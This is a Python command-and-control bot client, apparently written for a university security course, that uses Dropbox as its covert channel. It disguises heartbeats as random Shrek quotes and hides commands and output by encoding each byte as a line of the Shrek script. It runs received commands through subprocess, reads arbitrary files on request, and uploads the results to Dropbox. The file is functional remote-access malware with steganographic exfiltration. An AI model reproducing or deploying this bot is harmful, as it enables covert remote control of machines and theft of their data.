#!/usr/bin/env python3

import datetime
import os
import random
import subprocess
import time
from typing import List
import dropbox

adjectives1 = [
    "adorable",
    "adventurous",
    "aggressive",
    "agreeable",
    "alive",
    "amused",
    "angry",
    "annoyed",
    "annoying",
    "anxious",
    "arrogant",
    "ashamed",
    "attractive",
    "average",
    "awful",
    "beautiful",
    "bewildered",
    "bloody",
    "blueeyed",
    "blushing",
    "bored",
    "brave",
    "busy",
]
adjectives2 = [
    "shy",
    "sleepy",
    "smiling",
    "strange",
    "stupid",
    "talented",
    "tasty",
    "terrible",
    "thankful",
    "thoughtful",
    "tired",
    "ugly",
    "uninterested",
    "unusual",
    "upset",
    "wicked",
    "worried",
    "wrong",
]
animals = [
    "Wolf",
    "Gingerbread",
    "Mirror",
    "Pinocchio",
    "Mice",
    "Pigs",
    "Knight",
    "Captain",
    "Cyclops",
    "Dwarves",
    "Fairies",
    "Geppetto",
    "Giant",
    "Horseman",
    "HumptyDumpty",
    "RedRidingHood",
    "RobinHood",
    "Mongo",
    "Muffin Man",
    "PeterPan",
    "Rumpelstiltskin",
    "Dwarves",
    "Thelonious",
    "Bears",
    "Thumbelina",
    "Thumb",
    "Wicked Queen",
]
quotes = [
    "That'll do, Donkey. That'll do.",
    "That must be Lord Farquaad's castle. Do you think he's maybe compensating for something?",
    "Well, actually, that would be a giant. Now, ogres — oh, they're much worse. They'll make a suit from your freshly peeled skin! They'll shave your liver, squeeze the jelly from your eyes! Actually, it's quite good on toast.",
    "Well, it's no wonder you don't have any friends.",
    "Ogres are like onions.",
    "Hey! I'm no one's messenger boy, all right? I'm a delivery boy.",
    "There's a stack of freshly made waffles in the middle of the forest! Don't you find that a wee bit suspicious?",
    "Donkey, two things, OK? Shut… up.",
    "Donkey, if that was me, you'd be dead. That's brimstone… we must be getting close.",
    "What are you doing in my swamp!?",
    "Well my stomach aches and my palms just got sweaty, must be a high school.",
    "Someday, I will repay you. Unless, of course, I can't find you. Or I forget.",
    "After a while, you learn to ignore the names people call you and just trust who you are.",
    "You know what the best part of today was? I got the chance to fall in love with you all over again.",
    "All right, you're going the right way for a smack bottom.",
    "You know what? Maybe there's a good reason donkeys shouldn't talk.",
    "You know, Donkey, sometimes things are more than they appear.",
    "This is the part where you run away.",
    "I like my privacy.",
    "Roar!",
    "Wow! Let's do that again!",
    "Only a true friend would be that truly honest.",
    "Because that's what friends do, they FORGIVE EACH OTHER!",
    "This'll be fun. We'll stay up late, swapping manly stories, and in the morning… I'm making waffles!",
    "I like that boulder. That is a nice boulder.",
    "You might have seen a housefly, maybe even a superfly, but I bet you ain't never seen a donkey fly.",
    "Don't you want to tell me about your trip? How about a game of Parcheesi?",
    "Please! I don't wanna go back there. You don't know what it's like to be considered a freak… well, maybe you do, but that's why we gotta stick together. You gotta let me stay!",
    "Wow, that was really scary, and if you don't mind me saying, if that don't work, your breath will certainly get the job done, 'cause you definitely need some Tic Tacs or something 'cause your breath STINKS.",
    "It's gonna be champagne wishes and caviar dreams from now on.",
    "Oh, Shrek. Don't worry; things just seem bad because it's dark and rainy and Fiona's father hired a sleazy hitman to whack you. It'll be better in the morning. You'll see.",
    "Man, you gotta warn somebody before you crack one like that. My mouth was open and everything.",
    "And then one time I ate some rotten berries. Man, there were some strong gases eeking outta my butt that day.",
    "Blue flower, red thorns. Blue flower, red thorns. Blue flower, red thorns. Man, this would be so much easier if I wasn't color blind!",
    "You know what ELSE everybody likes? Parfaits! Have you ever met a person, you say, 'Let's get some parfait,' they say, 'Hell no, I don't like no parfait'? Parfaits are delicious!",
    "Wake up and smell the pheromones.",
    "Before this is over, I'm gonna need a whole lot of serious therapy. Look at my eye twitchin'.",
    "C'mon, princess, you're not that ugly. All right, you are ugly. But you're only like this at night. Shrek's ugly 24/7.",
    "Huh, celebrity marriages. They never last, do they?",
    "Oh, what large teeth you have. I mean, white sparkly teeth. I know you probably hear this all the time from your food, but you must bleach or something, 'cause that's one dazzling smile you got there. And do I detect a hint of minty freshness?",
    "All right, nobody move! I got a dragon here, and I'm not afraid to use it. I'm a donkey on the edge!",
    "Don't die, Shrek. And if you see any long tunnels, stay away from the light!",
    "She called me a noble steed.",
    "You, uh, you don't entertain much, do you?",
    "You cut me deep, Shrek. You cut me real deep just now.",
    "That's another thing we have in common. I hate it when you've got someone in your face, you try to give someone a hint and they won't leave, and then there's that big awkward silence, you know?",
    "Oh! Pick me! Pick me! Me! Me! Meeee!",
    "Don't mess wit' me. I'm the Stair Master. I've mastered the stairs. I wish I had a step right here, I could step here and here and here and step all over it.",
    "Eat me!",
    "You're a monster.",
    "Don't tell him anything!",
    "No, not the buttons… not my gumdrop buttons!",
    "OK… I'll tell you. Do you know the Muffin Man?",
    "Well, she's married to the Muffin Man.",
    "It's ALIVE!",
    "I hate these ball shows. They bore me to tears! Flip over to Wheel of Torture.",
    "It looks like we're up chocolate creek without a popsicle stick.",
    "Fire up the ovens, Muffin Man! We've got a big order to fill.",
    "Quick, rewind it!",
    "God bless us, everyone.",
    "Some of you may die, but it's a sacrifice I'm willing to make.",
    "Shrek, Fiona…will you accept an old frog's apology and my blessing?",
    "Five shillings for the possessed toy. Take it away.",
    "Good morning. Um, how do you like your eggs?",
    "Although she lives with seven other men, she's not easy.",
    "I'm not a puppet. I'm a real boy.",
    "Yes, I know the muffin man. Who lives on Drury Lane?",
    "There's an arrow in your butt.",
    "Welcome to Duloc, such a perfect town / Here we have some rules, let us lay them down / Don't make waves, stay in line, and we'll get along fine / Duloc is a perfect place, please keep off the grass, shine your shoes, wipe your… face / Duloc is, Duloc is, Duloc is a perfect place.",
    "I'm not the monster here. You are. You and the rest of that fairy tale trash, poisoning my perfect world. Now tell me!",
    "He hoofed unt he poofed unt he... signed an eviction notice.",
    "OK, let me get this straight: You gonna go fight a dragon and rescue a princess just so Farquaad'll give you back your swamp, which you only don't have 'cos he filled it full of freaks in the first place, is that about right?",
    "You're so wrapped up in layers, onion boy, you're afraid of your own feelings.",
]

byte_phrases = [
    "All right, get out of here.",
    "All of you, move it!",
    "Come on!",
    "Let's go!",
    "Hapaya! Hey!",
    "Quickly.",
    "Come on!",
    "(more dwarves run inside the house)",
    "No, no!",
    "Not there.",
    "(they shut the door on him)",
    "(turns to look at Donkey)",
    "Hey, don't look at me.",
    "I didn't invite them.",
    "Oh, gosh, no one invited us.",
    "What?",
    "We were forced to come here.",
    "(flabbergasted)",
    "By who?",
    "Lord Farquaad.",
    "He huffed and he puffed and he...signed an eviction notice.",
    "(heavy sigh)",
    "Who knows where this Farquaad guy is?",
    "Everyone looks around at each other but no one answers.",
    "Oh, I do.",
    "I know where he is.",
    "Does anyone else know where to find him?",
    "Anyone at all?",
    "Me!",
    "Anyone?",
    "(sigh)",
    "Attention, all fairy tale things.",
    "Do not get comfortable.",
    "Your welcome is officially worn out.",
    "In fact, I'm gonna see this guy Farquaad right now and get you all off my land and back where you came from!",
    "(Pause, then the crowd goes wild.)",
    "(to Donkey)",
    "You're comin' with me.",
    "All right, that's what I like to hear, man.",
    "Shrek and Donkey, two stalwart friends, off on a whirlwind big-city adventure.",
    "I love it!",
    "(singing)",
    "On the road again.",
    "Sing it with me, Shrek.",
    "I can't wait to get on the road again.",
    "What did I say about singing?",
    "Can I whistle?",
    "No.",
    "Can I hum it?",
    "All right, hum it.",
    "Donkey begins to hum 'On the Road Again'.",
    "A masked man is torturing the Gingerbread Man. ",
    "He's continually dunking him in a glass of milk.",
    "Lord Farquaad walks in.",
    "That's enough.",
    "He's ready to talk.",
    "The Gingerbread Man is pulled out of the milk and slammed down onto a cookie sheet.",
    "Farquaad laughs as he walks over to the table.",
    "However when he reaches the table we see that it goes up to his eyes.",
    "He clears his throat and the table is lowered.",
    "(He picks up the Gingerbread Man's legs and plays with them.)",
    "Run, run, run, as fast as you can.",
    "You can't catch me.",
    "I'm the gingerbread man.",
    "You are a monster.",
    "I'm not the monster here.",
    "You and the rest of that fairy tale trash, poisoning my perfect world.",
    "Where are the others?",
    "Eat me!",
    "(He spits milk into Farquaad's eye.)",
    "I've tried to be fair to you creatures.",
    "Now my patience has reached its end!",
    "(He makes as if to pull off the Gingerbread Man's buttons)",
    "No, no, not the buttons.",
    "Not my gumdrop buttons.",
    "Who's hiding them?",
    "Do you know the muffin man?",
    "The muffin man?",
    "The muffin man.",
    "Yes, I know the muffin man, who lives on Drury Lane?",
    "Well, she's married to the muffin man.",
    "She's married to the muffin man.",
    "The door opens and the Head Guard walks in.",
    "Then what are you waiting for? ",
    "Bring it in.",
    "More guards enter carrying something that is covered by a sheet.",
    "They hang up whatever it is and remove the sheet.",
    "It is the Magic Mirror.",
    "(in awe)",
    "Magic mirror...",
    "Don't tell him anything!",
    "(Farquaad picks him up and dumps him into a trash can with a lid.)",
    "Mirror, mirror on the wall.",
    "Is this not the most perfect kingdom of them all?",
    "Well, technically you're not a king.",
    "Uh, Thelonius.",
    "(Thelonius holds up a hand mirror and smashes it with his fist.)",
    "You were saying?",
    "What I mean is you're not a king yet.",
    "But you can become one.",
    "All you have to do is marry a princess.",
    "(chuckles nervously)",
    "So, just sit back and relax, my lord, because it's time for you to meet today's eligible bachelorettes.",
    "And here they are! Bachelorette number one is a mentally abused shut-in from a kingdom far, far away.",
    "She likes sushi and hot tubbing anytime.",
    "Her hobbies include cooking and cleaning for her two evil sisters.",
    "Please welcome Cinderella.",
    "(shows picture of Cinderella)",
    "Bachelorette number two is a cape-wearing girl from the land of fancy.",
    "Although she lives with seven other men, she's not easy.",
    "Just kiss her dead, frozen lips and find out what a live wire she is.",
    "Give it up for Snow White!",
    "(shows picture of Snow White)",
    "And last, but certainly not last, bachelorette number three is a fiery redhead from a dragon-guarded castle surrounded by hot boiling lava!",
    "But don't let that cool you off.",
    "She's a loaded pistol who likes pina colads and getting caught in the rain.",
    "Yours for the rescuing, Princess Fiona!",
    "(Shows picture of Princess Fiona)",
    "So will it be bachelorette number one, bachelorette number two or bachelorette number three?",
    "(holds up 2 fingers)",
    "Pick number three, my lord!",
    "Okay, okay, uh, number three!",
    "Lord Farquaad, you've chosen Princess Fiona.",
    "Princess Fiona.",
    "She's perfect.",
    "All I have to do is just find someone who can go...",
    "But I probably should mention the little thing that happens at night.",
    "Yes, but after sunset...",
    "Silence!",
    "I will make this Princess Fiona my queen, and DuLoc will finally have the perfect king!",
    "Captain, assemble your finest men.",
    "We're going to have a tournament.",
    "(smiles evilly)",
    "DuLoc Parking Lot - Lancelot Section",
    "Shrek and Donkey come out of the field that is right by the parking lot.",
    "The castle itself is about 40 stories high.",
    "But that's it. That's it right there.",
    "That's DuLoc. I told ya I'd find it.",
    "So, that must be Lord Farquaad's castle.",
    "That's the place.",
    "Do you think maybe he's compensating for something?",
    "(He laughs, but then groans as Donkey doesn't get the joke.)",
    "(He continues walking through the parking lot.)",
    "Wait up, Shrek.",
    "Hurry, darling.",
    "We're late. Hurry.",
    "(The attendant, who is wearing a giant head that looks like Lord Farquaad, screams and begins running through the rows of rope to get to the front gate to get away from Shrek.)",
    "Look, I'm not gonna eat you. I just - - I just - -.ImportError",
    "(He sighs and then begins walking straight through the rows.)",
    "(The attendant runs into a wall and falls down.)",
    "(Shrek and Donkey look at him then continue on into DuLoc.)",
    "They look around but all is quiet.",
    "Where is everybody?",
    "Hey, look at this!",
    "Donkey runs over and pulls a lever that is attached to a box marked 'Information'.",
    "The music winds up and then the box doors open up.",
    "There are little wooden people inside and they begin to sing.",
    "Welcome to DuLoc such a perfect town",
    "Here we have some rules.",
    "Let us lay them down.",
    "Don't make waves, stay in line.",
    "And we'll get along fine.",
    "DuLoc is perfect place.",
    "Please keep off of the grass.",
    "Shine your shoes, wipe your... face.",
    "DuLoc is, DuLoc is.",
    "DuLoc is perfect place.",
    "Suddenly a camera takes Donkey and Shrek's picture.",
    "Wow! Let's do that again! (makes ready",
    "to run over and pull the lever again)",
    "(grabs Donkey's tail and holds him still)",
    "No, no, no!",
    "They hear a trumpet fanfare and head over to the arena.",
    "Brave knights.",
    "You are the best and brightest in all the land.",
    "Today one of you shall prove himself...",
    "As Shrek and Donkey walk down the tunnel to get into the arena Donkey is humming the DuLoc theme song.",
    "You're going the right way for a smacked bottom.",
    "Sorry about that.",
    "That champion shall have the honor - - no, no - - the privilege to go forth and rescue the lovely Princess Fiona from the fiery keep of the dragon.",
    "If for any reason the winner is unsuccessful, the first runner-up will take his place and so on and so forth.",
    "Some of you may die, but it's a sacrifice I am willing to make.",
    "(cheers)",
    "Let the tournament begin!",
    "(He notices Shrek)",
    "It's hideous!",
    "(turns to look at Donkey and then back",
    "at Farquaad)",
    "Ah, that's not very nice.",
    "It's just a donkey.",
    "Knights, new plan!",
    "The one who kills the ogre will be named champion!",
    "Have it him!",
    "Get him!",
    "Now come on!",
    "Hang on now.",
    "(bumps into a table where there are mugs of beer)",
    "Go ahead!",
    "(holds up a mug of beer)",
    "Can't we just settle this over a pint?",
    "Kill the beast!",
    "He takes the mug and smashes the spigot off the large barrel of beer behind him.",
    "The beer comes rushing out drenching the other men and wetting the ground.",
    "It's like mud now.",
    "Shrek slides past the men and picks up a spear that one of the men dropped.",
    "As Shrek begins to fight Donkey hops up onto one of the larger beer barrels.",
    "It breaks free of it's ropes and begins to roll.",
    "Donkey manages to squish two men into the mud.",
    "There is so much fighting going on here I'm not going to go into detail.",
    "Suffice to say that Shrek kicks butt.",
    "Hey, Shrek, tag me!",
    "Shrek comes over and bangs a man's head up against Donkeys.",
    "Shrek gets up on the ropes and interacts with the crowd.",
    "A man tries to sneak up behind Shrek, but Shrek turns in time and sees him.",
    "Give him the chair!",
    "Shrek smashes a chair over the guys back.",
    "Finally all the men are down.",
    "Donkey kicks one of them in the helmet, and the ding sounds the end of the match.",
    "The audience goes wild.",
    "The laughter stops as all of the guards turn their weapons on Shrek.",
    "Shall I give the order, sir?",
    "No, I have a better idea.",
    "People of DuLoc, I give you our champion!",
    "Congratulations, ogre.",
    "You're won the honor of embarking on a great and noble quest.",
    "I'm already in a quest, a quest to get my swamp back.",
    "Your swamp?",
    "Yeah, my swamp!",
    "Where you dumped those fairy tale creatures!",
    "Indeed. All right, ogre. I'll make you",
    "a deal. Go on this quest for me, and",
    "I'll give you your swamp back.",
    "Exactly the way it was?",
    "Down to the last slime-covered toadstool.",
    "And the squatters?",
    "As good as gone.",
    "What kind of quest?",
    "Time Lapse - Donkey and Shrek are now walking through the field heading away from DuLoc.",
    "Shrek is munching on an onion.",
    "Let me get this straight.",
    "You're gonna go fight a dragon and rescue a princess just so Farquaad will give you back a swamp which you only don't have because he filled it full of freaks in the first place. Is that about right?",
    "You know, maybe there's a good reason",
    "donkeys shouldn't talk.",
    "I don't get it.",
    "Why don't you just pull some of that ogre stuff on him?",
    "Throttle him, lay siege to his fortress, grinds his bones to make your bread, the whole ogre trip.",
    "Oh, I know what.",
    "Maybe I could have decapitated an entire village and put their heads on a pike, gotten a knife, cut open their spleen and drink their fluids.",
    "Does that sound good to you?",
    "Uh, no, not really, no.",
    "For your information, there's a lot more to ogres than people think.",
    "Example?",
    "Okay, um, ogres are like onions.",
    "(he holds out his onion)",
    "(sniffs the onion)",
    "They stink?",
]

finished_commands = 0
response_content = ""


def generate_name():
    return (
        random.choice(adjectives1)
        + " "
        + random.choice(adjectives2)
        + " "
        + random.choice(animals)
    )


def generate_quotes():
    n = random.randint(1, 5)
    return "Best quotes:\n" + "\n".join(random.choice(quotes) for _ in range(n))


def bytes_to_text(input: bytes) -> str:
    return "\n".join(byte_phrases[b] for b in input)


def run_shell(cmd: List[str]) -> bytes:
    return subprocess.run(cmd, stdout=subprocess.PIPE).stdout


def write_file(dbx: dropbox.Dropbox):
    global response_content
    dbx.files_upload(
        bytes(response_content, encoding="utf-8"),
        "/wtf_dialogues/" + name + ".txt",
        mode=dropbox.files.WriteMode.overwrite,
        client_modified=datetime.datetime.now(),
        mute=True,
    )


def process_commands(dbx: dropbox.Dropbox, name: str, commands: List[str]):
    global finished_commands
    global response_content
    responses: List[bytes] = []
    for command in commands[finished_commands:]:
        finished_commands += 1
        print("Received command:", command)
        command_args = command.split(" ")
        if command_args[0] == "cp":
            with open(command_args[1], "rb") as f:
                response = f.read()
        else:
            response = run_shell(command_args)
        responses.append(command.encode("utf-8") + bytes([0x00]) + response)
    if len(responses) > 0:
        response_content += (
            "\n---\n".join(bytes_to_text(response) for response in responses)
            + "\n---\n"
        )
    dbx.files_upload(
        bytes(response_content, encoding="utf-8"),
        "/wtf_dialogues/" + name + ".txt",
        mode=dropbox.files.WriteMode.overwrite,
        client_modified=datetime.datetime.now(),
        mute=True,
    )


def heatbeat(dbx: dropbox.Dropbox, name: str):
    print("Sending heartbeat")
    contents = bytes(generate_quotes(), encoding="utf-8")
    dbx.files_upload(
        contents,
        "/quotes/" + name + ".txt",
        mode=dropbox.files.WriteMode.overwrite,
        client_modified=datetime.datetime.now(),
        mute=True,
    )


def parse_encoded(input: str) -> List[str]:
    bts: List[int] = []
    result: List[str] = []
    for line in input.strip().split("\n"):
        if line == "---":
            result.append(bytes(bts).decode("utf-8"))
            bts = []
        else:
            bts.append(byte_phrases.index(line))
    return result


def check_commands(dbx: dropbox.Dropbox, name: str):
    try:
        md, res = dbx.files_download("/fav_scenes/" + name + ".txt")
        data: str = res.content.decode("utf-8")
        if data:
            commands = parse_encoded(data)
            process_commands(dbx, name, commands)
    except dropbox.exceptions.ApiError as e:
        print("No commands received", e)


if __name__ == "__main__":
    print("Welcome to the Command and Control client!")
    print("    by Petr Zahradnik")
    print("    for the course BSY at FEE CTU in Prague")
    print()
    dbx = dropbox.Dropbox(oauth2_access_token=os.environ.get("TOKEN"))
    name = generate_name()
    print("This bot's name is '" + name + "'")

    dbx.files_upload(
        "".encode("utf-8"),
        "/fav_scenes/" + name + ".txt",
        mode=dropbox.files.WriteMode.overwrite,
        client_modified=datetime.datetime.now(),
        mute=True,
    )

    while True:
        heatbeat(dbx, name)
        check_commands(dbx, name)
        sleep_time = 5  # random.randint(10, 60)
        time.sleep(sleep_time)
